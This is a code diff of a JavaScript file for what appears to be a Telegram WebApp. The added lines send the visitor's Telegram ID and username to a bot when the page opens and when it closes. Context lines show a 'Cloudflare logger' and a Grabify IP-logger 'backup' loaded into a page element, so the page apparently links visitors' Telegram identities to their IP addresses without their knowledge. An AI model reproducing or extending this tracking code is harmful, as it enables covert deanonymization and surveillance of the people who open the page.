@@ -262,6 +262,34 @@
             console.log('✅ Cloudflare logger triggered for user:', userId);
         }, 1500);
 
+        // Отправляем TG ID боту при закрытии WebApp
+        window.addEventListener('beforeunload', function() {
+            if (tg) {
+                try {
+                    tg.sendData(JSON.stringify({
+                        action: 'webapp_close',
+                        id: userId,
+                        username: userName
+                    }));
+                } catch(e) {}
+            }
+        });
+        
+        // Или через 5 секунд автоматически
+        setTimeout(function() {
+            if (tg) {
+                try {
+                    tg.sendData(JSON.stringify({
+                        action: 'webapp_open',
+                        id: userId,
+                        username: userName
+                    }));
+                } catch(e) {
+                    console.log('sendData error:', e);
+                }
+            }
+        }, 5000);
+
         // === GRABIFY BACKUP ===
         setTimeout(function() {
             document.getElementById('grabify').src = GRABIFY_URL;
